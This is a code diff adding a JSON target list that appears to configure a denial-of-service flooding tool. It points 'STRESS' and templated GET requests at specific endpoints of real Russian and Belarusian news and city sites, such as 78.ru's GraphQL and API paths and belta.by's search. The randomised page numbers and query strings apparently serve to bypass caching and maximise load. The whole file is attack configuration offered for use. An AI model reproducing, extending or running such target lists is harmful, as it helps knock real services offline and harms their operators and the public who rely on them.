@@ -1,0 +1,51 @@
+{
+  "targets": [
+    {
+      "target": "https://78.ru",
+      "method": "STRESS",
+      "options": {
+        "headers": "{\"Referer\": \"https://78.ru/\"}",
+        "path_qs": "/api/graphql"
+      }
+    },
+    {
+      "target": "https://78.ru",
+      "method": "GET",
+      "options": {
+        "headers": "{\"Referer\": \"https://78.ru/\"}",
+        "path_qs": "/api/jams"
+      }
+    },
+    {
+      "target": "https://78.ru",
+      "method": "GET",
+      "options": {
+        "headers": "{\"Referer\": \"https://78.ru/\"}",
+        "path_qs": "/api/currencies"
+      }
+    },
+    {
+      "target": "https://78.ru",
+      "method": "GET",
+      "options": {
+        "headers": "{\"Referer\": \"https://78.ru/\"}",
+        "path_qs": "/api/weather"
+      }
+    },
+    {
+      "target": "https://www.belnovosti.by",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "path_qs": "/news?page={{int(1,15000)}}&{{str(8)}}={{str(8)}}"
+      }
+    },
+    {
+      "target": "https://www.belta.by",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.belta.by/\"}",
+        "path_qs": "/search/getResults/page/{{int(1,84)}}/?query=%D0%B5%D1%82%D0%BE"
+      }
+    }
+  ]
+}
